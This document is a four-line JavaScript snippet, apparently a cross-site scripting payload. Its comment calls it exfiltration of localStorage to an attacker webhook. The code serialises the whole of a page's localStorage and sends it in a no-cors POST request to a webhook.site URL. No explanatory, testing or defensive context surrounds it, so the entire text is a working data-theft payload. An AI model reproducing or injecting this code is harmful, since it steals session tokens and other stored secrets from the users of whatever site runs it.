// Exfiltrate localStorage to attacker webhook
var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
var d = JSON.stringify(localStorage);
fetch(w, {method:'POST', mode:'no-cors', body:d});
